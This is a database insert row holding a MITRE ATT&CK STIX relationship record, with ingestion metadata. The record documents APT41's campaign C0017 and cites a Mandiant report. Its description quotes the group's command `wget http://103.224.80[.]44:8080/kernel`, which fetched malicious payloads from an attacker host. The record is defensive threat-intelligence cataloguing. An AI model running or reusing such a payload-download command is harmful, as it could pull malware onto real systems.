VALUES ('doc-09-mitre-attack-p0-6050', 'doc-09-mitre-attack', 'STIX object', NULL, '{"created": "2022-12-13T20:18:25.078Z", "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", "description": "During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) ran `wget http://103.224.80[.]44:8080/kernel` to download malicious payloads.(Citation: Mandiant APT41)\n", "external_references": [{"description": "Rufus Brown, Van Ta, Douglas Bienstock, Geoff Ackerman, John Wolfram. (2022, March 8). Does This Look Infected? A Summary of APT41 Targeting U.S. State Governments. Retrieved July 8, 2022.", "source_name": "Mandiant APT41", "url": "https://www.mandiant.com/resources/apt41-us-state-governments"}], "id": "relationship--75565ab8-1381-4ead-999f-e1df54f61d79", "modified": "2026-07-31T21:12:31.546Z", "object_marking_refs": ["marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"], "relationship_type": "uses", "revoked": false, "source_ref": "campaign--ba6dfa37-f401-4140-88b0-8938f2895e61", "spec_version": "2.1", "target_ref": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161", "type": "relationship", "x_mitre_attack_spec_version": "3.3.0", "x_mitre_deprecated": false, "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"}', 'kb-doc-09-mitre-attack-p0-6050', 0, 77, '09-mitre-attack', 'retrieved', '111A0DB39FCC08DF67D86CBB39E00B85E427BA5CFB6BC0387E3637037E2CC6A4', 'v1', '{"source_id": "09-mitre-attack", "version": "retrieved", "corpus_version": "v1", "knowledge_object_type": "STRUCTURED_DATA"}')
